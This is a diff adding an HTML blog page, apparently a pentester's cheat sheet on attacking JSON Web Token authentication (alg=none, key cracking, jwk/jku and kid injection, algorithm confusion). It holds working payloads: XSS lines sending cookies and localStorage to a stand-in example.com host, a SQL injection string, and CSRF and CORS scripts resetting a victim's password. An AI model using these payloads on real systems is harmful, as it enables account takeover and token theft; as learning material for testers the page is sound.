@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/newblog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=newblog/livereload" data-no-instant defer></script>
+  
+    <title>JWTs Attacks Cheat-Sheet :: My New Hugo Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Explore the most common JWTs Attacks !" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/newblog/posts/jwts-attacks/" />
+
+
+  
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/buttons.min.3be0bba9fe18b5b77c8fe97175a5ff803eb3b8d6b94a4c43e6c842bc229040f1.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/fonts.min.90c955c31dd7c0e05aae3d4f583d4d8a2af799d69c961337eaf2a825063a55dd.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/main.min.1d8be2dd1b5de9fdaed058c8c59fcf4485f36619574abfb47ed0cfda4812c16d.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/post.min.ae96bd858b485e91dd4d30f50f4298bdc371cb1a2a55dcfa043d76a6c95b59b0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/terminal.min.fa7e148bd9d175a5fda1e62ea44a0e535f3bb05f7634ec615154cccbe71b3a9a.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/newblog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/newblog/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/newblog/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="JWTs Attacks Cheat-Sheet">
+<meta property="og:description" content="Explore the most common JWTs Attacks !" />
+<meta property="og:url" content="http://localhost:1313/newblog/posts/jwts-attacks/" />
+<meta property="og:site_name" content="My New Hugo Site" />
+
+  <meta property="og:image" content="http://localhost:1313/newblog/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-08-13 11:47:29 &#43;0100 &#43;01" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="http://localhost:1313/newblog/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/newblog/posts/jwts-attacks/">JWTs Attacks Cheat-Sheet</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-08-13</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="toolkits">Toolkits<a href="#toolkits" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><a href="https://jwt.io">jwt.io</a></li>
+<li><code>hashcat</code></li>
+<li><code>JSON Web Key</code> Burp Extension</li>
+<li><code>jwt_tool.py</code></li>
+<li><code>rsa_sign2n</code></li>
+</ul>
+<p><img src="https://flowhero.github.io/assets/images/shemas/1aAH0mMomx1dLidhoNCVmNw.png" alt="image"></p>
+<h2 id="i---jwks-common-locations">I - JWKS common locations<a href="#i---jwks-common-locations" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<blockquote>
+<p>If you don&rsquo;t know what JWTs are yet, please check <a href="https://jwt.io/introduction">https://jwt.io/introduction</a>, it&rsquo;ll take you about 5 minutes to read.</p>
+</blockquote>
+<p>First thing we can do, is looking for any exposed JWTs keys (or set of keys) on common locations (JSON Web Key Store) file. Some common locations for this would be:</p>
+<ul>
+<li>/.well-known/jwks.json</li>
+<li>/openid/connect/jwks.json</li>
+<li>/jwks.json</li>
+<li>/api/keys</li>
+<li>/api/v1/keys</li>
+</ul>
+<p>To automate this, you can use <code>common.txt</code> wordlist under Web-Contet directory on the SecLists Github Repository:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u <span style="color:#f92672">[</span>TARGET<span style="color:#f92672">]</span>.com/FUZZ -w ~/tools/SecLists-2023.2/Discovery/Web-Content/common.txt
+</span></span></code></pre></div><p>There are two standard header claims that can direct the service to the <strong>Public Key</strong> for verification:</p>
+<ul>
+<li><strong>jku</strong> - a claim pointing towards the JWKS URL</li>
+<li><strong>x5u</strong> - a claim pointing towards the X509 certificate location (could be in a JWKS file)</li>
+</ul>
+<p>This is how JWTs keys would look like :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;keys&#34;</span>: 
+</span></span><span style="display:flex;"><span>[ 
+</span></span><span style="display:flex;"><span>	{ 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;AQAB&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&#34;</span> 
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span> ]
+</span></span></code></pre></div><h2 id="ii---attacks-on-jwt">II - Attacks on JWT<a href="#ii---attacks-on-jwt" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="21---jwt-authentication-bypass-via-unverified-signature">2.1 - JWT authentication bypass via unverified signature<a href="#21---jwt-authentication-bypass-via-unverified-signature" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Just change the JWT body(=payload) and send the request leaving the signature as is and check if the server is checking the signature.
+( For example if in the payload part of the token you can just change &ldquo;name&rdquo; to another user&rsquo;s name and use the updated token to see if you can access his account )</li>
+</ul>
+<h3 id="22---jwt-authentication-bypass-via-flawed-signature-verification">2.2 - JWT authentication bypass via flawed signature verification<a href="#22---jwt-authentication-bypass-via-flawed-signature-verification" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Change Body</li>
+<li>Change <em>alg</em> to <strong>none</strong></li>
+<li>Remove Signature part (Not the dot at the end)</li>
+</ul>
+<h3 id="23---jwt-authentication-bypass-via-weak-signing-key">2.3 - JWT authentication bypass via weak signing key<a href="#23---jwt-authentication-bypass-via-weak-signing-key" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Crack Key used for Signature</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">16500</span> &lt;YOUR-JWT&gt; /path/to/jwt.secrets.list
+</span></span></code></pre></div><ul>
+<li>Change body in <a href="https://jwt.io">jwt.io</a> and enter Key in Trailer field</li>
+</ul>
+<h3 id="24---jwt-authentication-bypass-via-jwk-header-injection">2.4 - JWT authentication bypass via jwk header injection<a href="#24---jwt-authentication-bypass-via-jwk-header-injection" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Generate RSA</li>
+<li>Repeater -&gt; JSON Web Token TAB -&gt; Attack -&gt; Embedded JWK</li>
+<li>Notice <em>jwk</em> added in header</li>
+<li>Change body</li>
+<li>Send request</li>
+</ul>
+<blockquote>
+<p>Instead of using the built-in attack in the JWT Editor extension, you can embed a JWK by adding a <code>jwk</code> parameter to the header of the JWT manually. In this case, you need to also update the <code>kid</code> header of the token to match the <code>kid</code> of the embedded key.</p>
+</blockquote>
+<h3 id="25---jwt-authentication-bypass-via-jku-header-injection">2.5 - JWT authentication bypass via jku header injection<a href="#25---jwt-authentication-bypass-via-jku-header-injection" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Generate RSA</li>
+<li>Copy PK as JWK</li>
+<li>Create an endpoint of the PK:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;keys&#34;</span>: 
+</span></span><span style="display:flex;"><span>[ 
+</span></span><span style="display:flex;"><span>	{ 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kty&#34;</span>: <span style="color:#e6db74">&#34;RSA&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;e&#34;</span>: <span style="color:#e6db74">&#34;AQAB&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;kid&#34;</span>: <span style="color:#e6db74">&#34;75d0ef47-af89-47a9-9061-7c02a610d5ab&#34;</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;n&#34;</span>: <span style="color:#e6db74">&#34;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&#34;</span> 
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span> ]
+</span></span></code></pre></div><ul>
+<li>Change <em>kid</em> in you cookie with the generated one and <strong>Inject</strong> <em>jku</em> in the header the link to the endpoint containing our key :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;RS256&#34;</span>,  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&#34;jku&#34;</span>: <span style="color:#e6db74">&#34;https://mysite.com/keys.json&#34;</span>  
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>Sign it in Burp <strong>JSON Web Key</strong> extention</li>
+<li>Send request</li>
+</ul>
+<h3 id="26---jwt-authentication-bypass-via-kid-header">2.6 - JWT authentication bypass via kid header<a href="#26---jwt-authentication-bypass-via-kid-header" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h4 id="261---path-traversal">2.6.1 - Path Traversal<a href="#261---path-traversal" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<blockquote>
+<p><code>kid</code> is an optional header claim which holds a key identifier, particularly useful when you have multiple keys to sign the tokens and you need to look up the right one to verify the signature.</p>
+</blockquote>
+<ul>
+<li>Generate Symetric Key with <code>key = null byte</code> base64 encoded (AA==)</li>
+</ul>
+<p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_19_231603.png" alt="image"></p>
+<ul>
+<li>Change <em>kid</em> to <code>/dev/null</code> which represent Null byte</li>
+<li>Change Body</li>
+<li>Sign with the generated Key</li>
+</ul>
+<p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_19_232035.png" alt="image"></p>
+<h4 id="262---sql-injection">2.6.2 - SQL Injection<a href="#262---sql-injection" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>In a scenario where the content of the &ldquo;kid&rdquo; is used to retreive the password from the database, you could change the payload inside the &ldquo;kid&rdquo; parameter to: <code>non-existent-index' UNION SELECT 'ATTACKER';-- -</code> and then sign the JWT with the secret key <code>ATTACKER</code>.</p>
+<h3 id="27---jwt-authentication-bypass-via-algorithm-confusion">2.7 - JWT authentication bypass via algorithm confusion<a href="#27---jwt-authentication-bypass-via-algorithm-confusion" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p><a href="https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/">https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/</a></p>
+<ul>
+<li>Get <strong>Public Key</strong>
+<ul>
+<li>Get <strong>Public Keys</strong> from [[#JWKS common locations]]</li>
+<li>or Crack it with <code>jwt_forgery.py</code></li>
+<li>or use this :</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>openssl s_client -connect example.com:443 2&gt;&amp;<span style="color:#ae81ff">1</span> &lt; /dev/null | sed -n <span style="color:#e6db74">&#39;/-----BEGIN/,/-----END/p&#39;</span> &gt; certificatechain.pem 
+</span></span><span style="display:flex;"><span>openssl x509 -pubkey -in certificatechain.pem -noout &gt; pubkey.pem
+</span></span></code></pre></div><p>Or we can use this</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 jwt_forgery<span style="color:#f92672">.</span>py <span style="color:#f92672">&lt;</span>jwt1<span style="color:#f92672">&gt;</span> <span style="color:#f92672">&lt;</span>jwt2<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_20_003929.png" alt="image"></p>
+<p>To verify if the public key generated is right :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 jwt_tool<span style="color:#f92672">.</span>py <span style="color:#f92672">-</span>V <span style="color:#f92672">-</span>pk <span style="color:#f92672">&lt;</span>jwt_key<span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">`</span> to verify <span style="color:#66d9ef">if</span> its right
+</span></span></code></pre></div><p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_20_005548.png" alt="image"></p>
+<p>Or you can verify by using the <strong>Tampered x509 JWT</strong> and sending the request, if you get <em>200</em> then it&rsquo;s your account and it is the correct X.509 key.  Else repeat the Public key derivation Process.</p>
+<ul>
+<li>
+<p>Copy <strong>Public Key</strong> with the blank line at the end !!
+<img src="https://flowhero.github.io/assets/images/shemas/2023_07_20_011040.png" alt="image"></p>
+</li>
+<li>
+<p><strong>PEM</strong> to <strong>JWK</strong></p>
+</li>
+<li>
+<p>Generate RSA key using the <strong>JWK</strong> we got from <strong>PEM</strong></p>
+</li>
+<li>
+<p>Generate New Symetric Key with <strong>base64 Encoded PEM</strong> in <em>k</em> value :</p>
+</li>
+</ul>
+<p><img src="https://flowhero.github.io/assets/images/shemas/2023_07_20_012443.png" alt="image"></p>
+<ul>
+<li>
+<p>Change <code>alg</code> parameter to <code>HS256</code></p>
+</li>
+<li>
+<p>Change body as you like</p>
+</li>
+<li>
+<p>Sign it using the symetric Key</p>
+</li>
+<li>
+<p>Send Request</p>
+</li>
+<li>
+<p><a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key">JWT authentication bypass via algorithm confusion with no exposed key</a></p>
+</li>
+</ul>
+<h2 id="iii---stealing-jwts">III - Stealing JWTs<a href="#iii---stealing-jwts" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<hr>
+<p>There&rsquo;s no need to hack JWTs if you can <strong>steal</strong> and replay them!</p>
+<p>If you have other vulnerabilities in the application you may be able to steal or hijack the tokens of other users.</p>
+<h3 id="31---xss">3.1 - XSS<a href="#31---xss" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/cookiestealer.php?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://example.com/log.php?localStorage=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(window[<span style="color:#e6db74">&#39;localStorage&#39;</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">or</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://example.com/?password=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">secretPasswordVariable</span>;
+</span></span></code></pre></div><h3 id="32---csrf">3.2 - CSRF<a href="#32---csrf" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>JWT tokens stored in cookies (whether they are HTTPOnly or not) will be automatically sent by the browser when an authenticated user interacts with the target site. When a victim triggers a CSRF payload the browser will send the associated cookies including the token. The attacker won&rsquo;t be able to see these, but as they are being used to do the attacker&rsquo;s bidding that doesn&rsquo;t really matter.</p>
+<p><strong>Example:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;form</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;autosubmit&#34;</span> <span style="color:#a6e22e">action=</span><span style="color:#e6db74">&#34;http://www.example.com/account/passwordreset&#34;</span> <span style="color:#a6e22e">enctype=</span><span style="color:#e6db74">&#34;text/plain&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;victim1&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;BadGuyKnowsThis!&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;input</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;Submit Request&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/form&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;script&gt;</span>
+</span></span><span style="display:flex;"><span>document.getElementById(&#34;autosubmit&#34;).submit();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/script&gt;</span>
+</span></span></code></pre></div><h3 id="33---cors-misconfiguration">3.3 - CORS Misconfiguration<a href="#33---cors-misconfiguration" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>When a site&rsquo;s CORS policy allows arbitrary origins as well as sending credentials it is possible to craft an attack page containing an XHR request to the webserver, while also capturing the response.</p>
+<p><strong>This leads to two possible attack paths:</strong></p>
+<ol>
+<li>
+<p>If the JWT is returned in any HTTP responses from the application, the token can be read by the attacker when the &rsquo;trigger&rsquo; request is sent. A good example of this is a JWT &lsquo;refresh token&rsquo; or queries to an account page or login page.</p>
+</li>
+<li>
+<p>If the JWT is sent in a cookie then CORS can be used as a type of CSRF to send the token without the attacker needing to see it.</p>
+</li>
+</ol>
+<p><strong>Example - XHR CORS:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://www.avictimwebsitewithJWTcookieauth.com/api/refreshtoken&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json;charset=UTF-8&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p><strong>Example - XHR CSRF:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://www.avictimwebsitewithJWTcookieauth.com/api/passwordreset&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/json;charset=UTF-8&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#39;{&#34;newpass&#34;:&#34;BadGuyKnowsThis!&#34;}&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><h3 id="34---man-in-the-middle">3.4 - Man-in-the-Middle<a href="#34---man-in-the-middle" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>JWTs may also be seen in captured HTTP traffic, either in the header/body of unencrypted traffic, in log files of firewalls/gateways/other servers, in referrer links (if exposed as a URL parameter), or a range of other places.</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2024 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/newblog/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
